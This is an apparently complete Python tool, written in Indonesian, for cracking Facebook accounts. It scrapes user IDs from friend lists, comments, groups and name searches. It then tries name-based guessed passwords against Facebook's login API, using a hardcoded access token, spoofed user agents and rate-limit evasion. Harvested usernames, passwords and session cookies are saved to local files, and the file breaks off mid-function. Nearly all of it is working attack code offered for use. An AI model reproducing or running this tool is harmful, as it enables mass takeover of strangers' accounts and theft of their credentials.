###----------[ IMPORT MODULE LAIN ]---------- ###
import os, sys, re, time, requests, calendar, random, bs4, uuid, json, subprocess, base64
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import date,datetime
from requests.exceptions import ConnectionError
ses = requests.Session()

###----------[ IMPORT MODULE RICH ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()

###----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = "[#AF00FF]" #UNGU

###----------[ GLOBAL NAMA ]---------- ###
sekarang = calendar.timegm(time.gmtime(time.time()))
tampung = []
ugent = [] 

###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("*")[0]
	color_panel = file_color.split("*")[1]
except:
	color_text = "[#AF00FF]"
	color_panel = "#AF00FF"

###----------[ GET DATA DARI DEVICE ]---------- ###
android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
try:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
except:simcard = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
versi_app = str(random.randint(111111111,999999999))

###----------[ GENERATE USERAGENT ]---------- ###
for z in range(200):
	versi_android = str(random.randint(4,12))+".0.0"
	versi_chrome = str(random.randint(100,450))+".0.0."+str(random.randint(1,10))+"."+str(random.randint(100,250))
	rc = random.choice; rr = random.randint
	android = str(random.randint(4,12))
	aplikasi_versi = str(random.randint(100,299))+".0.0.0"	
	device = random.choice(["SM-J320FN Build/LMY47V","NEO-X7-216A Build/XRN68H","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09","m2006c3lg build/qp1a","SM-A546B Build/UP1A","Nokia C3 Build/QP1A"])
	dev = device.split(" Build/")[0]
	az = "A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"
	build = f"{random.choice(az)}{random.choice(az)}{random.choice(az)}{random.randint(10, 90)}{random.choice(az)}"
	versi = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
	verchrome = random.choice(["602.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	mob = random.choice(["14A456","14B100","14C92","14D27","14E304","14F89","14G60","13C75","13D15","13E233","13E238","13F69","13G34","13G36"])
	ua = f"Mozilla/5.0 (Linux; Android {android}; itel W7002P Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{versi_chrome} Mobile Safari/537.36 [FBAN/EMA;FBLC/de_DE;FBAV/{str(rr(1000,3000))}.0.0.{str(rr(1,30))}.{str(rr(1000,35000))};]"
	if ua in ugent:pass
	else:ugent.append(ua)
	
###----------[ LOGO AUTHOR DAN VERSI]---------- ###
class Logo:
	
	###----------[ BERSIHKAN LAYAR ]---------- ###
	def bersihkan_layar(self):
		if "linux" in sys.platform.lower():
			try:os.system("clear")
			except:pass
		elif "win" in sys.platform.lower():
			try:os.system("cls")
			except:pass
		else:
			try:os.system("clear") 
			except:pass

###----------[ LOGO ]---------- ###
	def logonya(self):
		self.bersihkan_layar()
		prints(Panel(f"""{color_text} 
⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀   
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀    Jangan takut akan perubahan. 
    ⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇    Kita mungkin kehilangan sesuatu yang baik,namun
  ⢤⣀⣀⣀⭕  ⢸⣷ ⭕⣀⣤⣴⣿⣿⣿⣆  kita akan peroleh sesuatu yang lebih baik lagi.
     ⠹⠏   ⣿⣧ ⠹⣿⣿⣿⣿⣿⡿⣿
          ⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
           ⠦⠴⢿⢿⣿⡿⠷ ⣿ 
        ⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃ 
        ⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿       BY:IQBAL
        ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇  
          ⠙⠻⢿⣿⣿⣿⣿⠟⠁""",width=80,style=f"{color_panel}"))
###----------[ BAGIAN LOGIN ]---------- ###
class Login:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self):
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.negara = ses.get("http://ip-api.com/json/").json()["country"]

	###----------[ MENU LOGIN ]---------- ###
	def menu_login(self):
		Logo().logonya()
		prints(Panel(f"{K2}{self.ip}",padding=(0,30),subtitle=f"{K2}{self.negara}",style=f"{color_panel}"))
		prints(Panel(f"""{K2}[{color_text}01{K2}]. login menggunakan cookie facebook
[{color_text}02{K2}]. login menggunakan kredensial""",width=80,padding=(0,15),style=f"{color_panel}"))
		login = console.input(f" {K2}• {K2}pilih menu : ")
		if login in["1","01"]:
			prints(Panel(f"""{K2}silahkan masukan cookiemu disini dan pastikan autentikasi tidak aktif""",width=80,style=f"{color_panel}"))
			cookie = console.input(f" {K2}• {K2}masukan cookie : ")
			#open("data/cookie","w").write(cookie)
			self.login_cookie(cookie)
		else:
			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
			
	###----------[ LOGIN COOKIE ]---------- ###
	def login_cookie(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
			open("data/cookie","w").write(cookie)
			Menu().menu()
		except:
			prints(Panel(f"""{M2}cookie invalid, silahkan gunakan cookie lain yang masih baru atau fresh""",width=80,style=f"{color_panel}"))
			sys.exit()
		
	###----------[ UBAH BAHASA ]---------- ###
	def ubah_bahasa(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
			parsing = parser(url.text,"html.parser")
			for x in parsing.find_all("form",{"method":"post"}):
				if "Bahasa Indonesia" in str(x):
					data = {
						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
						"submit"  : "Bahasa Indonesia"
					}
					post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
		except:
			pass
		
###----------[ BAGIAN MENU ]---------- ###
class Menu:	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self):
		self.men = []
		self.id = []
		self.ip = ses.get("http://ip-api.com/json/").json()["query"]
		self.negara = ses.get("http://ip-api.com/json/").json()["country"]

	###----------[ CEK INFO LOGIN ]---------- ###
	def cek_login(self,cookie):
		try:
			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=cookie).text
			nama = re.findall("<title>(.*?)</title>",url)[0]
			if "Konten Tidak Ditemukan" in nama:
				try:os.remove("data/cookie")
				except:pass
				Login().menu_login()
			else:
				return nama
		except ConnectionError:
			prints(Panel(f"""{M2}koneksi internet kamu bermasalah, silahkan cek koneksi kamu kembali""",width=80,style=f"{color_panel}"))
			exit()
			
	###----------[ MENU UTAMA ]---------- ###
	def menu(self):
		Logo().logonya()
		
		###----------[ GET COOKIE DAN DATA ]---------- ###
		try:
			cok = open("data/cookie","r").read()
			cookie = {"cookie": cok}
			nama = self.cek_login(cookie)
		except:
			try:os.remove("data/cookie")
			except:pass
			Login().menu_login()
		
		###----------[ PANEL BIASA ]---------- ###
		prints(Panel(f"{K2}{self.ip}",padding=(0,30),title=f"{K2}{nama}",subtitle=f"{K2}{self.negara}",style=f"{color_panel}"))
		prints(Panel(f"""{K2}[{color_text}01{K2}]. crack dari id publik   [{color_text}05{K2}]. crack dari random username
[{color_text}02{K2}]. crack dari pengikut    [{color_text}06{K2}]. crack dari pencarian nama
[{color_text}03{K2}]. crack dari komentar    [{color_text}07{K2}]. crack dari member grup
[{color_text}04{K2}]. crack dari random mail [{color_text}08{K2}]. crack dari file sendiri""",width=80,padding=(0,6),style=f"{color_panel}"))
		prints(Panel(f"""{K2}ketik {M2}bot{K2} untuk ke menu bot dan ketik {M2}lain{K2} untuk ke menu lain""",width=80,padding=(0,6),style=f"{color_panel}"))
		menu = console.input(f" {M2}• {K2}pilih menu : ")
		
		###----------[ ID PUBLIK ]---------- ###
		if menu in["1","01"]:
			prints(Panel(f"""{K2}masukan id target, pastikan id target bersifat publik dan tidak private""",subtitle=f"{K2}ketik {M2}me{K2} untuk dump dari teman sendiri",width=80,style=f"{color_panel}"))
			user = console.input(f" {M2}• {K2}masukan id atau username : ")
			if user in["Me","me"]:
				user = Dump(cookie).GetUser()
			Dump(cookie).Dump_Publik(f"https://mbasic.facebook.com/{user}?v=friends")
			Crack().atursandi()
			
		###----------[ KOMENTAR ]---------- ###
		elif menu in["3","03"]:
			prints(Panel(f"""{K2}masukan id postingan, pastikan postingan bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
			user = console.input(f" {M2}• {K2}masukan id postingan : ")
			Dump(cookie).Dump_Komentar(f"https://mbasic.facebook.com/{user}")
			Crack().atursandi()
			
		###----------[ EMAIL ]---------- ###
		elif menu in["4","04"]:
			prints(Panel(f"""{K2}masukan nama dan format email gunakan '@' di awal contoh @gmail.com""",width=80,style=f"{color_panel}"))
			user = console.input(f" {M2}• {K2}masukan nama : ")
			format = console.input(f" {M2}• {K2}masukan format : ")
			limit = console.input(f" {M2}• {K2}masukan limit : ")
			Dump(cookie).Dump_Email(user,format,limit)
			Crack().atursandi()
			
		###----------[ USERNAME ]---------- ###
		elif menu in["5","05"]:
			prints(Panel(f"""{K2}masukan nama dan jika 2 kata bisa gunakan titik '.' sebagai pemisah""",width=80,style=f"{color_panel}"))
			user = console.input(f" {M2}• {K2}masukan nama : ")
			limit = console.input(f" {M2}• {K2}masukan limit : ")
			Dump(cookie).Dump_Username(user,limit)
			Crack().atursandi()
			
		###----------[ PENCARIAN NAMA ]---------- ###
		elif menu in["6","06"]:
			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"{color_panel}"))
			user = console.input(f" {M2}• {K2}masukan nama : ")
			common = open("asset/nama_indonesia","r").read().splitlines()
			for idt in user.split(","):
				self.id.append(idt)
				for people in common:
					self.id.append(people+" "+idt)
			try:
				for gas in self.id:
					Dump(cookie).Dump_Pencarian(f"https://mbasic.facebook.com/public/{gas}")
			except:pass
			Crack().atursandi()
		
		###----------[ MEMBER GRUP ]---------- ###
		elif menu in["7","07"]:
			prints(Panel(f"""{K2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
			user = console.input(f" {M2}• {K2}masukan id grup : ")
			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
			Crack().atursandi()
			
		###----------[ FILE MASSAL ]---------- ###
		elif menu in["8","08"]:
			prints(Panel(f"""{K2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=80,style=f"{color_panel}"))
			user = console.input(f" {M2}• {K2}masukan tempat file : ")
			Dump(cookie).Dump_File(user)
			Crack().atursandi()

		###----------[ PINDAH KE MENU BOT ]---------- ###
		elif menu in["BOT","Bot","bot"]:
			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
			
		###----------[ PINDAH KE MENU LAIN ]---------- ###
		elif menu in["LAIN","Lain","lain"]:
			Lain(cookie).menu()
			
		else:
			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))
			
###----------[ BAGIAN DUMP ]---------- ###
class Dump:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self,cookie):
		self.cookie = cookie
			
	###----------[ GET USER SENDIRI ]---------- ###
	def GetUser(self):
		try:
			url = ses.get("https://mbasic.facebook.com/profile.php",cookies=self.cookie).text
			uid = re.findall('name="target" value="(.*?)"',url)[0]
			return uid
		except:
			pass

	###----------[ DUMP ID PUBLIK ]---------- ###
	def Dump_Publik(self,url):
		try:
			url = parser(ses.get(url,cookies=self.cookie).text,"html.parser")
			for z in url.find_all("a",href=True):
				if "fref" in z.get("href"):
					if "/profile.php?id=" in z.get("href"):uid = "".join(bs4.re.findall("profile\.php\?id=(.*?)&",z.get("href")));nama = z.text
					else:uid = "".join(bs4.re.findall("/(.*?)\?",z.get("href")));nama = z.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {M2}• {K2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in url.find_all("a",href=True):
				if "Lihat Teman Lain" in x.text:
					self.Dump_Publik("https://mbasic.facebook.com/"+x.get("href"))
		except:pass
			
	###----------[ DUMP KOMENTAR ]---------- ###
	def Dump_Komentar(self,url):
		try:
			data = parser(ses.get(url).text,"html.parser")
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split('=')[1].replace("&refid","")
					else:uid = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
					nama = ids.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {M2}• {K2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for z in data.find_all("a",href=True):
				if "Lihat komentar sebelumnya…" in z.text:
					self.Dump_Komentar("https://mbasic.facebook.com"+z["href"])
		except:pass
		
	###----------[ DUMP PENCARIAN NAMA ]---------- ###
	def Dump_Pencarian(self,url):
		try:
			data = parser(ses.get(str(url)).text,'html.parser')
			for z in data.find_all("td"):
				namp = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(z))
				for uid,nama in namp:
					if "profile.php?" in uid:uid = re.findall("id=(.*)",str(uid))[0]
					elif "<span" in nama:nama = re.findall("(.*?)\<",str(nama))[0]
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Hasil Selanjutnya" in x.text:
					self.Dump_Pencarian(x.get("href"))
		except:pass
		
	###----------[ DUMP MEMBER GRUP ]---------- ###
	def Dump_MemberGrup(self,url):
		try:
			data = parser(ses.get(url,cookies=self.cookie,headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
			judul = re.findall("<title>(.*?)</title>",str(data))[0]
			for isi in data.find_all("h3"):
				for ids in isi.find_all("a",href=True):
					if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
					else:
						if ids.text==judul:pass
						else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
					if uid+"<=>"+nama in tampung:pass
					else:tampung.append(uid+"<=>"+nama)
					console.print(f" {M2}• {K2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
			for x in data.find_all("a",href=True):
				if "Lihat Postingan Lainnya" in x.text:
					self.Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
		except:pass
		
	###----------[ DUMP FILE ]---------- ###
	def Dump_File(self,lok):
		try:
			file = open(lok,"r").read().splitlines()
			for z in file:
				tampung.append(z)
		except:pass
		
	###----------[ DUMP EMAIL ]---------- ###
	def Dump_Email(self,nama,format,limit):
		try:
			for z in range(int(limit)):
				if len(nama.split()) > 1:
					email = str(nama.split()[0])+str(nama.split()[1])+str(z)+str(format)+"<=>"+str(nama.split()[0])+" "+str(nama.split()[1])
				else:
					email = str(nama)+str(z)+str(format)+"<=>"+str(nama)
				if email in tampung:pass
				else:tampung.append(email)
		except:pass
		
	###----------[ DUMP USERNAME ]---------- ###
	def Dump_Username(self,nama,limit):
		try:
			for z in range(int(limit)):
				if "." in nama:
					user = str(nama)+"."+str(z)+"<=>"+str(nama.replace("."," "))
				else:
					user = str(nama)+"."+str(z)+"<=>"+str(nama)
				if user in tampung:pass
				else:tampung.append(user)
		except:pass

###----------[ BAGIAN CRACK ]---------- ###
class Crack:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self):
		self.loop = 0
		self.ok = []
		self.cp = []
		self.apk = []
		self.aktif = []
		self.kadaluwarsa = []
		self.hari_ini = datetime.now().strftime("%d-%B-%Y")
		
	###----------[ ATUR SANDI DAN METODE ]---------- ###
	def atursandi(self):
		prints(Panel(f"""{K2}berhasil mengumpulkan {len(tampung)} id""",width=80,padding=(0,21),style=f"{color_panel}"))
		set = console.input(f" {M2}• {K2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
		
		###----------[ SANDI MANUAL ]---------- ###
		if set in["Y","y"]:
			prints(Panel(f"""{K2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
			pwx = console.input(f" {M2}• {K2}buat katasandi : ").split(",")
			if len(pwx)<=5:
				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=80,style=f"{color_panel}"))
				exit()

  	###----------[ SANDI OTOMATIS ]---------- ###
		else:
			prints(Panel(f"""{K2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
			app = console.input(f" {M2}• {K2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
			if app in["Y","y"]:
				self.apk.append("muncul")
			else:
				self.apk.append("kontol anjing")
			self.otomatis()
		
###----------[ CRACK MANUAL ]---------- ###
	def manual(self,pw):
		global prog,des
		prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					user = data.split("<=>")[0]
					nama = data.split("<=>")[1]
					pwx = pw
					fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{K2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
						
	###----------[ CRACK OTOMATIS ]---------- ###
	def otomatis(self):
		global prog,des
		prog = Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
		des = prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30) as fall:
				self.simpan_hasil()
				for data in tampung:
					try:
						pwx = []
						user = data.split("<=>")[0]
						nama = data.split("<=>")[1]
						depan = nama.split(" ")[0]
						if len(nama)<=5:
							if len(depan)<3:
								pass 
							else:
								pwx.append(depan+"123")
								pwx.append(depan+"12345")
						else:
							if len(depan)<3:
								pwx.append(nama)
							else:
								pwx.append(nama)
								pwx.append(depan+"123")
								pwx.append(depan+"12345")
							belakang = nama.split(" ")[1]
							if len(belakang)<3:
								pwx.append(depan+belakang)
							else:
								pwx.append(depan+belakang)
								pwx.append(belakang+"123")
								pwx.append(belakang+"12345")
						fall.submit(self.metode_api,user,pwx)
					except:
						fall.submit(self.metode_api,user,pwx)
		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
		sys.exit()
							
	###----------[ METODE API ]---------- ###
	def metode_api(self,email,pwx):
		prog.update(des,description=f" {U2}•{K2}{U2}[IQBALgntg]•{K2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{K2} CP : {M2}{len(self.cp)}{K2}")
		prog.advance(des)
		try:
			for pw in pwx:
				pw = pw.lower()
				ua = random.choice(ugent)
				params = {
					"access_token": "6628568379|c1e620fa708a1d5696fb991c1bde5662",
					"sdk_version": f"{str(random.randint(1,26))}", 
					"email": email,
					"locale": "en_US",
					"password": pw,
					"sdk": "android",
					"generate_session_cookies": "1",
					"sig": "6628568379"
				}
				headers = {
					"Host": "graph.facebook.com",
					"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
					"x-fb-sim-hni": str(random.randint(20000, 40000)),
					"x-fb-net-hni": str(random.randint(20000, 40000)),
					"x-fb-connection-quality": "EXCELLENT",
					"user-agent": ua,
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-http-engine": "Liger"
				}
				post = ses.post("https://graph.facebook.com/auth/login/",params=params, headers=headers, allow_redirects=False)
				if "session_key" in post.text and "EAA" in post.text:
					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
					sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					user = re.findall("c_user=(\d+)",cookie)[0]
					if user in self.ok or user in self.cp:
						break
					else:
						self.ok.append(user)
						if "muncul" in self.apk:
							self.get_apk(user,pw,cookie)
						else:
							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
							prints(tree)
							os.popen('play-audio o.mp3')
						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
						break
				elif "User must verify their account" in post.text:
					user = post.json()["error"]["error_data"]["uid"]
					if user in self.ok or user in self.cp:
						break
					else:
						self.cp.append(user)
						tree = Tree(Panel.fit(f"""{M2}{user}|{pw}{K2}""",style=f"{color_panel}"),guide_style="bold grey100")
						tree.add(Panel(f"{M2}{ua}{K2}",style=f"{color_panel}"))
						prints(tree)
						os.popen('play-audio c.mp3')
						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
						break
				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
					prog.update(des,description=f" {M2}•{K2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {M2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{K2}")
					prog.advance(des)
					time.sleep(30)
				else:continue
		except ConnectionError:
			time.sleep(30)
			self.metode_api(user,pwx)
		self.loop +=1

	###----------[ PRINT SIMPAN HASIL ]---------- ###
	def simpan_hasil(self):
		prints(Panel(f"""\r{K2}hasil crack ok tersimpan ke : OK/{self.hari_ini}.txt
{K2}hasil crack ok tersimpan ke : CP/{self.hari_ini}.txt""",width=80,padding=(0,10),style=f"{color_panel}"))
	
	###----------[ PRINT MUNCUL APK ]---------- ###
	def get_apk(self,user,pw,cookie):
		
		###----------[ CEK MODE GRATIS ]---------- ###
		try:
			url = ses.get("https://m.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://m.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
		except:pass
			
		###----------[ APLIKASI AKTIF ]---------- ###
		aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
		self.apkaktif("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookie)
		if len(self.aktif)==0:
			aktip.add(f"{K2}tidak ada aplikasi yang terkait")
		else:
			for apk in self.aktif:
				aktip.add(f"{M2}{apk}{K2}")
				
		###----------[ APLIKASI KADALUWARSA ]---------- ###
		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
		self.apkkadaluwarsa("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
		if len(self.kadaluwarsa)==0:
			kadalu.add(f"{K2}tidak ada aplikasi yang terkait")
		else:
			for apk in self.kadaluwarsa:
				kadalu.add(f"{M2}{apk}{K2}")
			
		###----------[ PRINT SEMUA ]---------- ###
		tree = Tree(Panel.fit(f"""{M2}{user}|{pw}{K2}""",style=f"{color_panel}"),guide_style="bold grey100")
		tree.add(aktip)
		tree.add(kadalu)
		tree.add(Panel(f"{M2}{cookie}{K2}",style=f"{color_panel}"))
		prints(tree)
		
	###----------[ GET APK AKTIF ]---------- ###
	def apkaktif(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Ditambahkan" in apk.text:
					self.aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
				else:continue
			next = "https://m.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apkaktif(next,cookie)
		except:pass
		
	###----------[ GET APK KADALUWARSA ]---------- ###
	def apkkadaluwarsa(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Kedaluwarsa" in apk.text:
					self.kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
				else:continue
			next = "https://m.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apkkadaluwarsa(next,cookie)
		except:pass
	
###----------[ MENU LAIN ]---------- ###
class Lain:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self,cookie):
		self.cookie = cookie
		self.file = []
		self.listfile = []
		
	###----------[ MENU ]---------- ###
	def menu(self):
		prints(Panel(f"""{K2}[{color_text}01{K2}]. lihat akun hasil crack  [{color_text}04{K2}]. ganti warna tema tools
[{color_text}02{K2}]. get info akun target    [{color_text}05{K2}]. tampilkan info cookies
[{color_text}03{K2}]. setting user agent      [{color_text}06{K2}]. logout ({M2}hapus login{K2})""",width=80,padding=(0,7),style=f"{color_panel}"))
		menu = console.input(f" {H2}• {P2}pilih menu : ")
		if menu in["01","1"]:
			self.cek_hasil()
		elif menu in["04","4"]:
			self.ganti_tema()
		elif menu in["05","5"]:
			self.tampil_cookie()
		elif menu in["06","6"]:
			os.system("rm data/cookie")
			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python run.py""",width=80,style=f"{color_panel}")))
		else:
			exit(prints(Panel(f"""{M2}🙏 maaf fitur ini belum tersedia, silahkan menunggu update selanjutnya""",width=80,style=f"{color_panel}")))

	###----------[ CEK HASIL CRACK ]---------- ###
	def cek_hasil(self):
		prints(Panel(f"""{K2}[{color_text}01{K2}]. lihat akun hasil crack ok
[{color_text}02{P2}]. lihat akun hasil crack cp""",width=80,padding=(0,20),style=f"{color_panel}"))
		ask = console.input(f" {M2}• {K2}masukan pilihan : ")
		if ask in["1","01"]:folder = "OK"
		else:folder = "CP"
		
		###----------[ PILIH FILE ]---------- ###
		dirs = os.listdir(folder)
		prints(Panel(f"""{K2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=80,padding=(0,15),style=f"{color_panel}"))
		num = 0
		for fil in dirs:
			num += 1
			self.file.append(fil)
			totalakun = open(f"{folder}/{fil}","r").read().splitlines()
			self.listfile.append(Panel(f"{K2}[{color_text}0{num}{K2}]",width=10,title=f"{K2}nomer",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{K2}{fil}",width=35,title=f"{K2}tanggal",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{K2}{len(totalakun)} akun",width=28,title=f"{K2}total akun",style=f"{color_panel}"))
		console.print(Columns(self.listfile))
		prints(Panel(f"""{K2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_panel}"))
		result = console.input(f" {M2}• {K2}masukan angka : ")
		
		###----------[ MULAI CEK ]---------- ###
		try:
			files = self.file[int(result)-1]
			totalhasil = open(f"{folder}/{files}","r").read().splitlines()
		except:
			prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=80,style=f"{color_panel}"))
